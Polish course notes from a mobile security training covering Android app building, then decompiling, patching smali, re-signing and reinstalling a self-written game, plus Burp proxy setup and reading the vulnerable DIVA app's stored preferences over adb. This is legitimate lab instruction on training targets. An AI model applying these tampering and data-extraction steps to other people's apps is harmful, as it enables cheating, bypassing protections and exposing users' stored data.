@@ -1,0 +1,2103 @@
+📅 18.02.2023 🕘 [09:00]
+
+Wykładowca: Magdalena Powałowska
+
+Global Mobile Security
+
+Chapter 1: Introduction to Android & Android Programing 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = -
+
+ℹ️ Przerwy:
+
+11:00-11.30
+13.00-13:45
+15.15-15.30
+
+[Introduction to Android]
+
+🔗 -- Instalacja Android Studio
+https://developer.android.com/studio
+
+    Dodajemy nowy emulator telefonu (Menu ...)
+
+    Virtual Device Manager
+
+    Create virtual device
+
+    Wybieramy Pixel 3a XL
+
+    Wersja SDK Q (Android 10 - API Level 29) - do pobrania
+
+    AVD Name: Pixel 3a XL API 29
+
+    Launch - uruchamiamy emulator
+
+
+HAXM:
+    https://github.com/intel/haxm/releases
+
+
+🔗 -- Aplikacje mobile-security.zip 143 MB
+https://we.tl/t-Ec2HqOp1pU
+
+# Tryb Developera
+
+Settings > About emulated device
+7x kliknąć w Build number
+
+    > You are now developer
+
+
+# Instalacja aplikacji Total Commander
+
+Przeciągamy plik z aplikacją TotalCommander-x86.apk do emulatora telefonu (drag & drop)
+
+# Ścieżka wszystkich aplikacji:
+    /data/data/
+
+***
+
+### 📋 – Lab01 Termux
+    
+# Instalacja aplikacji Termux
+com.termux_113.apk - 87.8 MB
+https://ln4.sync.com/dl/6846fe270/vk2dh6ft-avh2jbqv-5k6tz8st-mrirvu67/view/default/10149330800007
+
+***
+
+🔗 -- ToDo_1.24_Apkpure.apk
+https://d.apkpure.com/b/APK/com.jeffprod.todo?version=latest
+
+***
+
+New Project > Empty Activity
+cykl_zycia_aplikacji
+Java
+Minimum  SDK: Android 5.0
+
+🔗 -- Instalacja Java:
+https://nadwey.eu.org/java/8/jdk-8u351/
+Windows jdk-8u351-windows-x64.exe
+
+***
+
+MainActivity.java
+
+package com.hackeru.cykl_zycia_aplikacji;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.os.Bundle;
+
+import android.util.Log;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        Log.d("lifecycle","onCreate_invoked");
+        Toast.makeText(this, "onCreate", Toast.LENGTH_SHORT).show();
+    }
+
+    protected void onStart(){
+        super.onStart();
+        Log.d("lifecycle","onStart_invoked");
+        Toast.makeText(this, "onStart", Toast.LENGTH_SHORT).show();
+    }
+
+    protected void onResume(){
+        super.onResume();
+        Log.d("lifecycle","onResume_invoked");
+        Toast.makeText(this, "onResume", Toast.LENGTH_SHORT).show();
+    }
+
+    protected void onPause(){
+        super.onPause();
+        Log.d("lifecycle","onPause_invoked");
+        Toast.makeText(this, "onPause", Toast.LENGTH_SHORT).show();
+    }
+
+    protected void onStop(){
+        super.onStop();
+        Log.d("lifecycle","onStop_invoked");
+        Toast.makeText(this, "onStop", Toast.LENGTH_SHORT).show();
+    }
+
+    protected void onDestroy(){
+        super.onDestroy();
+        Log.d("lifecycle","onDestroy_invoked");
+        Toast.makeText(this, "onDestroy", Toast.LENGTH_SHORT).show();
+    }
+}
+
+***
+
+activity_main.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".MainActivity">
+
+    <TextView
+        android:id="@+id/textView"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Moj tekst"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0.498"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toTopOf="parent"
+        app:layout_constraintVertical_bias="0.14" />
+
+    <EditText
+        android:id="@+id/editTextTextPassword"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="100dp"
+        android:layout_marginTop="10dp"
+        android:layout_marginEnd="101dp"
+        android:layout_marginBottom="52dp"
+        android:ems="10"
+        android:inputType="textPassword"
+        app:layout_constraintBottom_toTopOf="@+id/imageView"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/editTextTextPersonName" />
+
+    <EditText
+        android:id="@+id/editTextTextPersonName"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="100dp"
+        android:layout_marginTop="40dp"
+        android:layout_marginEnd="101dp"
+        android:layout_marginBottom="10dp"
+        android:ems="10"
+        android:inputType="textPersonName"
+        app:layout_constraintBottom_toTopOf="@+id/editTextTextPassword"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/textView" />
+
+    <ImageView
+        android:id="@+id/imageView"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="142dp"
+        android:layout_marginTop="10dp"
+        android:layout_marginEnd="141dp"
+        android:layout_marginBottom="249dp"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0.0"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/editTextTextPassword"
+        tools:srcCompat="@tools:sample/avatars" />
+
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+
+***
+
+acitivity_main.xml 
+
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".MainActivity">
+
+    <TextView
+        android:id="@+id/mainMessage"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginTop="156dp"
+        android:layout_marginBottom="556dp"
+        android:text="Witaj w grze!!!"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0.498"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toTopOf="parent" />
+
+    <EditText
+        android:id="@+id/UserName"
+        android:layout_width="181dp"
+        android:layout_height="75dp"
+        android:layout_marginStart="103dp"
+        android:layout_marginTop="97dp"
+        android:layout_marginEnd="127dp"
+        android:layout_marginBottom="383dp"
+        android:ems="10"
+        android:inputType="textPersonName"
+        android:text="Wpisz imie"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/mainMassage" />
+
+    <Button
+        android:id="@+id/mainBTN"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="158dp"
+        android:layout_marginTop="91dp"
+        android:layout_marginEnd="160dp"
+        android:layout_marginBottom="244dp"
+        android:text="ZAGRAJ"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/UserName" />
+
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+***
+
+com.hackeru.game
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TextView mainMessage = findViewById(R.id.mainMessage);
+        EditText UserName = findViewById(R.id.UserName);
+        Button mainBTN = findViewById(R.id.mainBTN);
+
+        mainBTN.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Toast.makeText(MainActivity.this, "
+Kliknales przycisk
+", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+    }
+}
+
+***
+
+Main Activity - aktualizacja: 
+    
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TextView mainMessage = findViewById(R.id.mainMessage);
+        EditText UserName = findViewById(R.id.UserName);
+        Button mainBTN = findViewById(R.id.mainBTN);
+
+        mainBTN.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Toast.makeText(MainActivity.this, "Kliknales przycisk", Toast.LENGTH_SHORT).show();
+                helloName(UserName);
+            }
+
+            private void helloName(EditText UserName){
+                Toast.makeText(getApplicationContext(), "Witaj " + UserName.getText().toString(), Toast.LENGTH_SHORT).show();
+            }
+
+        });
+
+    }
+}
+
+***
+
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".GameActivity">
+
+    <TextView
+        android:id="@+id/gameMassage"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="157dp"
+        android:layout_marginTop="129dp"
+        android:layout_marginEnd="196dp"
+        android:layout_marginBottom="51dp"
+        android:text="Jestem w grze"
+        android:textSize="20dp"
+        app:layout_constraintBottom_toTopOf="@+id/score"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0.041"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintTop_toTopOf="parent"
+        app:layout_constraintVertical_bias="0.649" />
+
+    <TextView
+        android:id="@+id/score"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="153dp"
+        android:layout_marginEnd="200dp"
+        android:layout_marginBottom="136dp"
+        android:text="TextView"
+        android:textSize="20dp"
+        app:layout_constraintBottom_toTopOf="@+id/GameBTN"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="0.0"
+        app:layout_constraintStart_toStartOf="parent" />
+
+    <Button
+        android:id="@+id/GameBTN"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_marginStart="139dp"
+        android:layout_marginEnd="174dp"
+        android:layout_marginBottom="180dp"
+        android:text="Zwiększ"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintHorizontal_bias="1.0"
+        app:layout_constraintStart_toStartOf="parent" />
+
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+***
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TextView mainMessage = findViewById(R.id.mainMessage);
+        EditText UserName = findViewById(R.id.UserName);
+        Button mainBTN = findViewById(R.id.mainBTN);
+
+        mainBTN.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+//                Toast.makeText(MainActivity.this, "Kliknales przycisk", Toast.LENGTH_SHORT).show();
+//                helloName(UserName);
+
+                startActivity(new Intent(MainActivity.this, GameActivity.class).putExtra("UserName",UserName.getText().toString()));
+            }
+
+            private void helloName(EditText UserName){
+                Toast.makeText(getApplicationContext(), "Witaj " + UserName.getText().toString(), Toast.LENGTH_SHORT).show();
+            }
+        });
+
+    }
+}
+
+***
+
+GameActivity
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.os.Bundle;
+import android.widget.Button;
+import android.widget.TextView;
+
+public class GameActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_game);
+
+        TextView gameMessage = findViewById(R.id.gameMessage);
+        TextView score = findViewById(R.id.score);
+        Button GameBTN = findViewById(R.id.GameBTN);
+        
+        score.setText("0");
+        
+    }
+}
+
+***
+
+Aktualizacja GameActivity 
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.widget.Button;
+import android.widget.TextView;
+
+public class GameActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_game);
+
+        TextView gameMessage = findViewById(R.id.gameMessage);
+        TextView score = findViewById(R.id.score);
+        Button GameBTN = findViewById(R.id.GameBTN);
+
+        score.setText("0");
+        Intent thisInt = getIntent();
+        String UserName = thisInt.getStringExtra("UserName");
+        gameMessage.setText("Powodzenia " + UserName + "!");
+        
+    }
+}
+
+***
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+
+public class GameActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_game);
+
+        TextView gameMessage = findViewById(R.id.gameMessage);
+        TextView score = findViewById(R.id.score);
+        Button GameBTN = findViewById(R.id.GameBTN);
+
+        score.setText("0");
+        Intent thisInt = getIntent();
+        String UserName = thisInt.getStringExtra("UserName");
+        gameMessage.setText("Powodzenia " + UserName + "!");
+
+        GameBTN.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                addOne();
+            }
+
+            public void addOne(){
+                int scoreVal = Integer.parseInt(score.getText().toString());
+                scoreVal += 1;
+                score.setText(String.valueOf(scoreVal));
+            }
+
+        });
+
+    }
+}
+
+***
+
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    tools:context=".WinnerActivity">
+
+    <TextView
+        android:id="@+id/winnerMessage"
+        android:layout_width="261dp"
+        android:layout_height="64dp"
+        tools:layout_editor_absoluteX="75dp"
+        tools:layout_editor_absoluteY="252dp" />
+
+    <Button
+        android:id="@+id/winnerBTN"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Powrot do gry"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintTop_toBottomOf="@+id/winnerMassage"
+        app:layout_constraintVertical_bias="0.175"
+        tools:layout_editor_absoluteX="127dp" />
+</androidx.constraintlayout.widget.ConstraintLayout>
+
+***
+
+Winner Activity
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+
+public class WinnerActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_winner);
+
+        TextView winnerMessage = findViewById(R.id.winnerMessage);
+        Button winnerBTN = findViewById(R.id.winnerBTN);
+
+//        Intent thisInt = getIntent();
+//        String UserName = thisInt.getStringExtra("UserName");
+
+            String userNameNotIntent = "Twoje imie: Magda";
+            winnerMessage.setText("Gratulacje" + userNameNotIntent + "!" + "Wygrales gre! \n Twoja flaga to FLAG{BASE64}");
+            
+            winnerBTN.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    startActivity(new Intent(WinnerActivity.this, GameActivity.class).putExtra("UserName", userNameNotIntent ));
+                }
+            });
+
+
+    }
+}
+
+***
+
+GAmeActivity
+
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class GameActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_game);
+
+        TextView gameMessage = findViewById(R.id.gameMessage);
+        TextView score = findViewById(R.id.score);
+        Button GameBTN = findViewById(R.id.GameBTN);
+
+        score.setText("0");
+        Intent thisInt = getIntent();
+        String UserName = thisInt.getStringExtra("UserName");
+        gameMessage.setText("Powodzenia " + UserName + "!");
+
+        GameBTN.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                addOne();
+            }
+
+            public void addOne(){
+                int scoreVal = Integer.parseInt(score.getText().toString());
+                scoreVal += 1;
+//                score.setText(String.valueOf(scoreVal));
+                if (scoreVal == 22) {
+                    Toast.makeText(GameActivity.this, "You shall not pass", Toast.LENGTH_SHORT).show();
+                } else {
+                    score.setText(String.valueOf(scoreVal));
+                }
+
+                if (scoreVal > 22){
+                    Intent winner = new Intent(GameActivity.this, WinnerActivity.class);
+                    winner.putExtra("UserName", UserName);
+                    startActivity(winner);
+                }
+
+            }
+
+        });
+
+    }
+}
+
+***
+
+WinnerActivity - Final version
+
+package com.hackeru.game;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+
+public class WinnerActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_winner);
+
+        TextView winnerMessage = findViewById(R.id.winnerMessage);
+        Button winnerBTN = findViewById(R.id.winnerBTN);
+
+        Intent thisInt = getIntent();
+        String UserName = thisInt.getStringExtra("UserName");
+        
+            winnerMessage.setText("Gratulacje" + UserName + "!" + "Wygrales gre! \n Twoja flaga to FLAG{BASE64}");
+
+            winnerBTN.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    startActivity(new Intent(WinnerActivity.this, GameActivity.class).putExtra("UserName", UserName ));
+                }
+            });
+
+
+    }
+}
+
+***
+
+Podpisanie aplikacji
+
+    Build -> Generate Signed Bundle or APK
+
+    Next
+
+    Cerate New
+
+uzupełnić: Key store path (zapamiętać scieżkę), Password 2x, w certificate (cokolwiek) 
+
+    OK
+
+    Next
+
+    Release i Create
+
+
+przenieść klucz i aplikację do jednego folderu np.: game-apka-podpisana
+zmiana nazwy z app-realease.apk na game.apk
+
+***
+
+sprawdzamy adres IP: ipconfig
+C:\Users\Magda\Desktop\game-apka-podpisana> python3 -m http.server
+na kalim:
+    mkdir mobile_sec
+    cd mobile_sec
+    wget http://IP_windowsa:8000/game.apk
+    wget http://IP_windows:8000/mykey.jks
+instalujemy narzedzia: 
+    sudo apt install adb -y
+    sudo apt install jd-gui -y
+    sudo apt install dex2jar -y
+    sudo apt install apksigner -y
+    sudo apt install zipalign -y 
+    sudo apt install apktool -y
+    wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
+    sudo apt-get install apt-transport-https
+    echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
+    sudo apt-get update
+    sudo apt-get install sublime-text
+    
+    sudo apt install adb jd-gui dex2jar apksigner zipalign apktool-y
+    
+   d2j-dex2jar 
+    
+    
+┌──(kali㉿kali)-[~/mobile_sec]
+tree                                                                                                  
+.
+├── game.apk
+└── mykey.jks
+
+    apktool d game.apk -o game-apktool
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ tree -L 1
+.
+├── game.apk
+├── game-apktool
+└── mykey.jks
+    
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ subl game-apktool
+
+CTRL + shift+ P
+Install Package + enter
+Smali
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ apktool d -r -s game.apk -o game-apktool-classes-dex
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ cd game-apktool-classes-dex 
+                                                                             
+┌──(kali㉿kali)-[~/mobile_sec/game-apktool-classes-dex]
+└─$ tree -L 1
+.
+├── AndroidManifest.xml
+├── apktool.yml
+├── classes.dex
+├── original
+├── res
+└── resources.arsc
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ d2j-dex2jar game-apktool-classes-dex/classes.dex -o game.jar
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ tree -L 1
+.
+├── game.apk
+├── game-apktool
+├── game-apktool-classes-dex
+├── game.jar
+└── mykey.jks
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ jd-gui game.jar
+
+Zmiana linii 64 na add-int/lit8 v0, v0, 0x5
+w pliku GameActivity$1.smali
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ apktool b game-apktool -o game-po-zmianach.apk
+wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ java -jar apktool_2.7.0.jar b game-apktool -o game-po-przebudowaniu.apk
+
+jesli nie idzie
+
+java -jar apktool_2.7.0.jar b game_apktool --use-aapt2 -o game_po_zmianach_w_smali.apk
+
+
+W AndroidManifestl w linii 2 usunąć:
+android:dataExtractionRules="@xml/data_extraction_rules"
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ java -jar apktool_2.7.0.jar b game-apktool -o game-po-przebudowaniu.apk
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ tree -L 1
+.
+├── apktool_2.7.0.jar
+├── game.apk
+├── game-apktool
+├── game-apktool-classes-dex
+├── game.jar
+├── game-po-przebudowaniu.apk
+└── mykey.jks
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ zipalign -v -p 4 game-po-przebudowaniu.apk game-po-zipalign.apk
+
+#podpisanie aplikacji:
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ apksigner sign --ks mykey.jks game-po-zipalign.apk    
+ 
+ ***
+ 
+🔗 -- Instalator do genymotion:
+    https://www.genymotion.com/download/
+    
+W genymotion dodajemy nowy telefon (Samsung S10 - Android 10), przed uruchomieniem sprawdzamy ustawienia sieci VBox dla telefonu/genymotion
+
+    karta 1 (HostOnly) bez zmian (jeżeli są zmiany, telefon może się nie uruchomić) + zaawansowane (Allow All), 
+
+    karta 2 sieć nat (NatNetwork) + zaawansowane - pozwalaj (Allow All)
+
+#Kali musi być w tej samej sieci nat.
+
+    Dispaly ->  VMSVGA
+
+
+W genymotion dodajemy 2 telefon: Google Pixel 3a, Adroind 10 (4 procesory)
+
+    karta 1 (HostOnly) bez zmian (jeżeli są zmiany, telefon może się nie uruchomić) + zaawansowane (Allow All), 
+
+    karta 2 sieć nat (NatNetwork) + zaawansowane - pozwalaj (Allow All)
+
+#Kali musi być w tej samej sieci nat.
+
+    Dispaly ->  VMSVGA
+
+
+Jeśli nie działa:
+Uruchomić genymotion z uprawnieniami administratora.
+Sprawdzić jakie są adaptery w menadżerze urządzeń:
+1. jeśli są duplikaty to usuwamy je.
+2. jeśli nie są uruchomione (ikonka ze strzałką, należy je uruchomić)
+sprawdzamy ponownie czy uruchamia telefon 
+Jeśli nadal nie działa to usuwamy wszystkie adaptery ale tylko TE z numerkami (#1, #2,..) w  menadżerze urządzeń i uruchamiamy ponownie telefon, jeśli nie działa to sprawdzamy znów punkt 1 i 2 (j.w.)
+
+doinstalowanie bibliotek:
+https://www.download.net.pl/18973/Microsoft-Visual-C-Redistributable-Package-64-bit/
+
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ adb connect 192.168.54.119:5555
+┌──(kali㉿kali)-[~/mobile_sec]
+└─$ adb devices
+┌──(kali㉿kali)-[~/mobile_sec]
+
+└─$ adb install game-po-zipalign.apk
+
+
+***
+Podsumowanie wykonanych kroków:
+1. Napisalismy apke w Android Studio
+2. Podpisalismy apke w Android Studio
+3. Przenieslismy apke i klucz na kaliego 
+4. Uzylismy apktoola  w celu uzyskania kodu SMALI 
+5/6 Uzylismy apktoola  w celu uzyskania pliku classes.dex
+7. uzylismy narzedzia d2j-dex2jar w celu uzyskania pliku  z rozszerzeniem jar 
+8. otworzylismy plik .jar narzedziem jd-gui w celu przeczytania kodu w Javie (ktory wczesniej pisalismy w Android Studio)
+9. Otworzylismy plik smali i dokonalismy w nim zmian, by klikajac przechodzi o 5 kroków  dalej 
+10. zapisalismy zmiany w tym pliku 
+11. przebudowalismy plik apktoolem
+12 powstal nowy folder w game_apktool o nazwie dist i w tym folderze apka z roszerzeniem .apk ktora jest juz po naszych zmianach 
+12. za pomoca zipaligner uniknelismy strat plikow przy poprzednim kompresowaniu 
+13. podpisalismy apke przy pomocy narzedzia apksigner 
+14. laczymy sie z emulatorem w GenyMotion przy pomocy adb
+14. instalujemy apke na emulatorze z GenyMotion przy pomocy adb
+15. Wlaczamy nowa apke.
+
+***
+
+📅 19.02.2023 🕘 [09:00]
+
+Global Mobile Security
+
+Chapter 2 Android Reversing & Android Traffic Analysis 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - =
+
+#podłączenie do urzadzenia:
+┌──(kali㉿kali)-[~]
+└─$ adb connect 192.168.165.101:5555
+┌──(kali㉿kali)-[~]
+└─$ adb devices
+
+#uruchomienie burpsuite i wgranie certyfikatu na urządzenie:
+w burp klikamy: 
+    Proxy > Options
+    import/export CA Certificate > in DER format > next > określamy lokalizację i nazwę np.: /home/kali/mobile_security/cert.crt
+
+#wgrywamy wyeksportowany certyfikat na urządzenie:
+    ┌──(kali㉿kali)-[~/mobile_security]
+    └─$ adb push cert.crt /sdcard/
+
+#na urządzeniu przechodzimy do:
+    settings > security >  encryption and credentials > install from sdcard
+
+#dalej ustawiamy przekierowanie na burp:    
+    telefon > Settings > network & internet > Wi-Fi > settings > edycja (prawy górny róg) > Advanced option > Proxy (Manual) > podajemy IP z burpa , port 8080
+
+
+🔗 -- Aplikacje mobile_security:
+https://wetransfer.com/downloads/caba587a324e58127133cd0604e018f620230218084438/5994c4
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ mv ~/Downloads/mobile-security.zip .
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ unzip mobile-security.zip -f apki
+┌──(kali㉿kali)-[~/mobile_security/apki/mobile-security/apki]
+└─$ adb install diva-beta.apk
+
+🔗 -- OWASP Mobile:
+https://owasp.org/www-project-mobile-top-10/
+https://owasp.org/www-pdf-archive/OWASP_Application_Security_Verification_Standard_4.0-en.pdf
+https://github.com/OWASP/ASVS/tree/master/4.0
+https://github.com/OWASP/ASVS/blob/master/3.0.1/ASVS-excel-v3.0.1.xlsx
+https://owasp.org/www-pdf-archive/OWASP_Mobile_AppSec_Verification_Standard_v0.9.2.pdf
+
+┌──(kali㉿kali)-[~/mobile_security/apki/mobile-security/apki]
+└─$ sudo apktool d -r -s diva-beta.apk -o diva-classes-dex
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/diva-classes-dex]
+└─$ sudo d2j-dex2jar classes.dex -o diva.jar
+┌──(kali㉿kali)-[~/…/apki/mobile-security/apki/diva-classes-dex]
+└─$ jd-gui diva.jar
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell pm list packages
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell pm list packages | grep diva
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell pm path jakhar.aseem.diva
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell pm path com.android.bluetooth
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb pull /system/app/Bluetooth/Bluetooth.apk
+
+adb logcat
+adb logact | grep diva
+
+#ustawienie zmienych środowiskowych
+Zienne środowiskowe->nowe
+do path dodać: np.: C:\Program Files\Java\jdk-17.0.2\bin 
+#należy podać własną scieżkę - do path dodać: np.: 
+C:\Users\user\AppData\Local\Android\Sdk\platform-tools
+C:\Users\user\AppData\Local\Android\Sdk\build-tools\32.0.0  
+#user zastępujemy własną nazwą użytkownika
+np:
+C:\Users\48791\AppData\Local\Android\Sdk\platform-tools
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell ps
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell ps | grep diva
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb logcat --pid=2382
+
+InsecureDataStorage1Activity.class
+https://developer.android.com/reference/android/content/SharedPreferences
+https://developer.android.com/reference/android/content/SharedPreferences.Editor
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell
+vbox86p:/ # cd /data/data/jakhar.aseem.diva/
+vbox86p:/data/data/jakhar.aseem.diva # cd shared_prefs/
+
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
+┌──(kali㉿kali)-[~/mobile_security]
+└─$ adb shell cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
